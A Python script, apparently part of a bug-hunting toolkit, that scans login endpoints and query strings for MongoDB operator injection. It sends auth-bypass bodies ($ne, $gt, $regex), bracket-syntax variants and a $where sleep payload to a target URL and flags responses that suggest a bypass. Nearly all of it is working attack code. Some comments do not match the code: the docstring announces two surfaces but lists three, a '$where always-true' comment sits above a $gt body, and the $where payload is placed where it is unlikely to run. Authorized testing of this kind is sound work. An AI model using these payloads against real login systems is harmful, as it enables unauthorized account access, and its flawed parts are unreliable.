#!/usr/bin/env python3
"""
NoSQL injection scanner (MongoDB / Mongoose / and operator-injection style DBs).

Two attack surfaces:
  1. JSON body operator injection  — {"user":{"$ne":null},"pass":{"$ne":null}}
     turns an equality check into "match anything" -> auth bypass / data read.
  2. Query-string bracket injection — user[$ne]=&pass[$ne]=  (Express/qs parses
     bracket syntax into nested objects that reach the Mongo query verbatim).
  3. $where / $func time-based blind — {"$where":"sleep(5000)"} to confirm
     server-side JS evaluation when responses look identical.

Payload generation + the differential/timing classifier are pure and unit-
tested; only `scan_login()` touches the network.

Usage:
  tools/nosqli_scanner.py --login https://t/api/login --user-field email --pass-field password
  tools/nosqli_scanner.py --login https://t/api/login --baseline-user a@a.co --baseline-pass wrong
  tools/nosqli_scanner.py --query "https://t/api/items?id=1"
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass

_REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)
from tools.safe_http import safe_urlopen  # noqa: E402

USER_AGENT = "agentic-bug-hunter/nosqli_scanner"

# Operator payloads that mean "match anything" / "always true".
_AUTH_OPERATORS = [
    {"$ne": None},
    {"$ne": ""},
    {"$gt": ""},
    {"$gte": ""},
    {"$regex": ".*"},
    {"$exists": True},
]


def auth_bypass_bodies(user_field: str, pass_field: str) -> list[dict]:
    """JSON bodies that try to bypass a username/password equality check."""
    bodies: list[dict] = []
    for op in _AUTH_OPERATORS:
        bodies.append({user_field: dict(op), pass_field: dict(op)})
    # known-user + wildcard password (when username is guessable/enumerated)
    bodies.append({user_field: "admin", pass_field: {"$ne": ""}})
    # $where always-true (requires server-side JS eval enabled)
    bodies.append({user_field: {"$gt": ""}, pass_field: {"$gt": ""}})
    return bodies


def query_string_payloads(param: str) -> list[str]:
    """Bracket-syntax operator injection for Express/qs-style parsers."""
    return [
        f"{param}[$ne]=",
        f"{param}[$ne]=0",
        f"{param}[$gt]=",
        f"{param}[$regex]=.*",
        f"{param}[$exists]=true",
    ]


def where_sleep_body(user_field: str, pass_field: str, ms: int = 5000) -> dict:
    """$where time-based blind payload to confirm server-side JS evaluation."""
    return {
        user_field: "admin",
        pass_field: {"$where": f"sleep({ms})"},
    }


@dataclass
class NoSqlFinding:
    url: str
    technique: str
    payload: str
    evidence: str
    severity: str = "HIGH"

    def as_dict(self) -> dict:
        return {
            "url": self.url, "technique": self.technique, "payload": self.payload,
            "evidence": self.evidence, "severity": self.severity,
        }


def classify_differential(
    baseline_status: int, baseline_len: int,
    test_status: int, test_len: int,
) -> bool:
    """True if the test response looks like a successful auth bypass.

    Heuristic: a wrong-credential baseline returns 401/403/200-with-error; a
    successful bypass flips to 200/302 or materially changes the body length.
    """
    if baseline_status in (401, 403) and test_status in (200, 302, 301):
        return True
    if baseline_status == test_status and abs(test_len - baseline_len) > max(64, baseline_len * 0.25):
        return True
    return False


def classify_timing(baseline_ms: float, test_ms: float, sleep_ms: int = 5000) -> bool:
    """True if the $where sleep payload measurably delayed the response."""
    return test_ms - baseline_ms >= sleep_ms * 0.7


def _post_json(url: str, body: dict, timeout: int) -> tuple[int, int, float]:
    """POST a JSON body; return (status, body_len, elapsed_ms)."""
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"User-Agent": USER_AGENT, "Content-Type": "application/json"},
    )
    t0 = time.monotonic()
    try:
        with safe_urlopen(req, timeout=timeout) as resp:
            n = len(resp.read())
            return resp.status, n, (time.monotonic() - t0) * 1000
    except urllib.error.HTTPError as e:
        n = len(e.read()) if hasattr(e, "read") else 0
        return e.code, n, (time.monotonic() - t0) * 1000
    except (urllib.error.URLError, TimeoutError, ConnectionError):
        return 0, 0, (time.monotonic() - t0) * 1000


def scan_login(
    url: str, user_field: str, pass_field: str,
    baseline_user: str = "nouser@example.invalid",
    baseline_pass: str = "definitely-wrong-pw",
    timeout: int = 20,
) -> list[NoSqlFinding]:
    findings: list[NoSqlFinding] = []
    b_status, b_len, b_ms = _post_json(
        url, {user_field: baseline_user, pass_field: baseline_pass}, timeout
    )
    for body in auth_bypass_bodies(user_field, pass_field):
        t_status, t_len, _ = _post_json(url, body, timeout)
        if classify_differential(b_status, b_len, t_status, t_len):
            findings.append(NoSqlFinding(
                url, "operator-auth-bypass", json.dumps(body),
                f"baseline {b_status}/{b_len}B -> payload {t_status}/{t_len}B",
            ))
    # time-based $where confirmation
    _, _, w_ms = _post_json(url, where_sleep_body(user_field, pass_field), timeout)
    if classify_timing(b_ms, w_ms):
        findings.append(NoSqlFinding(
            url, "where-sleep-blind", '{"$where":"sleep(5000)"}',
            f"baseline {b_ms:.0f}ms -> $where {w_ms:.0f}ms", "CRITICAL",
        ))
    return findings


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="NoSQL injection scanner")
    ap.add_argument("--login", help="login endpoint URL (JSON body)")
    ap.add_argument("--user-field", default="username")
    ap.add_argument("--pass-field", default="password")
    ap.add_argument("--baseline-user", default="nouser@example.invalid")
    ap.add_argument("--baseline-pass", default="definitely-wrong-pw")
    ap.add_argument("--query", help="GET URL — prints bracket-injection variants to try")
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args(argv)

    if not args.login and not args.query:
        ap.error("provide --login <url> or --query <url>")

    findings: list[NoSqlFinding] = []
    if args.login:
        findings = scan_login(
            args.login, args.user_field, args.pass_field,
            args.baseline_user, args.baseline_pass, args.timeout,
        )
        if not args.json:
            if findings:
                for f in findings:
                    print(f"[{f.severity}] NoSQLi ({f.technique}): {f.url}")
                    print(f"    payload:  {f.payload}")
                    print(f"    evidence: {f.evidence}")
            else:
                print(f"[ok] {args.login} — no NoSQL injection detected")

    if args.query:
        # bracket injection on a GET param can't be auto-confirmed without a
        # known baseline; emit the variants for the hunter to diff manually.
        from urllib.parse import urlparse, parse_qs
        params = list(parse_qs(urlparse(args.query).query).keys()) or ["id"]
        print(f"# bracket-injection variants for {args.query}")
        for p in params:
            for v in query_string_payloads(p):
                print(f"  {v}")

    if args.json:
        print(json.dumps([f.as_dict() for f in findings], indent=2))
    return 2 if findings else 0


if __name__ == "__main__":
    sys.exit(main())
